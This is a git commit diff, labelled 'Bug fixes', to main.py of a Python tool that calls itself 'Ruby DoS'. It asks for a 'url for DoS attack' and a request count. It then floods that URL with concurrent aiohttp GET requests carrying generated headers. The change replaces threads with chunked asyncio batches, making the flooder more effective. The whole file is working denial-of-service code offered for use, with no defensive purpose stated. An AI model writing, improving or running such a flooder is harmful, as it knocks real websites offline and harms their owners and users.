da3302adc20729bbd407f92f51323fb993d5e891
ZakTheTop <vrmsumy3@gmail.com>
2023-08-24 11:00:57 +0300

    Bug fixes

--- main.py
+++ main.py
@@ -1,6 +1,7 @@
 import os
 import aiohttp
 import asyncio
+from datetime import time
 from datetime import datetime
 from colorama import Fore
 from utils.headers import initHeaders
@@ -19,31 +20,37 @@ def timewrap(function):
         function(*args)
         end = datetime.now()
 
-        print(Fore.YELLOW + "Thread has been closed | Time: " + str(end-start) + Fore.RESET)
+        print(Fore.YELLOW + "Done | Time: " + str(end-start) + Fore.RESET)
     return wrapper
 
 async def make_request(url: str):
     async with aiohttp.ClientSession() as session:
         try:
-            async with session.get(url, headers=initHeaders()):
-                print(Fore.GREEN + "Request for url " + url + " is completed" + Fore.RESET)
+            async with session.get(url, headers=initHeaders(), proxy=None):
+                print(f'{Fore.GREEN}Request for url {url} is completed | {datetime.now().strftime("%H:%M:%S:%f %d-%m-%Y")} {Fore.RESET}')
         except:
             print(Fore.RED + "Request for url " + url + " is not done" + Fore.RESET)
 
 
-async def main(url: str, amount_of_requests: int):
+async def main(url: str, amount_of_requests: int, chunk_size: int):
     tasks = []
+    done = 0
     try:
-        for i in range(amount_of_requests):
+        for _ in range(amount_of_requests):
             tasks.append(asyncio.create_task(make_request(url)))
+            done += 1
+            if done == amount_of_requests or len(tasks) == chunk_size:
+                await asyncio.gather(*tasks)
+                tasks = []
+
     except Exception as ex:
         print("Something went wrong")
         print(ex)
-    await asyncio.gather(*tasks)
+
 
 @timewrap
-def start_thread(url: str, amount_of_requests: int):
-    asyncio.run(main(url, amount_of_requests))
+def start_thread(url: str, amount_of_requests: int, chunk_size: int):
+    asyncio.run(main(url, amount_of_requests, chunk_size))
 
 if __name__ == '__main__':
     clear()
@@ -62,10 +69,8 @@ if __name__ == '__main__':
     \n''')
     print("Ruby DoS\n")
     url = input("Enter url for DoS attack: ")
-    threads = int(input("Enter amount of threads: "))
-    amount_of_requests = int(input("Enter amount of requests per thread: "))
-    for t in range(threads):
-        thread = threading.Thread(target=start_thread, name=f'thread{t}', args= {url, amount_of_requests})
-        thread.start()
-        thread.join(50)
+    amount_of_requests = int(input("Enter amount of requests: "))
+    chunk_size = int(input("Enter size of chunk: "))
+    #thread = threading.Thread(target=start_thread, name=f'thread{t}', args= {url, chunk_size})
+    start_thread(url, amount_of_requests, chunk_size)
 
